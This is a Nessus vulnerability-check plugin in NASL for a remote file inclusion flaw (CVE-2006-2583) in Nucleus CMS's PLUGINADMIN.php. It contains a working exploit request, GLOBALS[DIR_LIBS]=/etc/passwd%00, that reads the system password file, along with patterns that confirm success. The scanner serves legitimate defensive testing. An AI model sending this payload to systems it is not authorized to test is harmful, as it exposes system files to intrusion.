#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21596);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-2583");
  script_bugtraq_id(18097);
  script_osvdb_id(25749);

  script_name(english:"Nucleus CMS PLUGINADMIN.php DIR_LIBS Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using Nucleus CMS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to remote
file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Nucleus CMS, an open source content
management system. 

The version of Nucleus CMS installed on the remote host fails to
sanitize input to the 'DIR_LIBS' parameter before using it in a PHP
include() function in the 'nucleus/libs/PLUGINADMIN.php' script. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this flaw to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/434837/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.nucleuscms.org/item/3038" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Nucleus version 3.23 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/23");
 script_cvs_date("$Date: 2013/01/24 17:54:57 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:nucleus_group:nucleus_cms");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/nucleus", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/nucleus/libs/PLUGINADMIN.php?",
      "GLOBALS[DIR_LIBS]=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0ADMIN\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
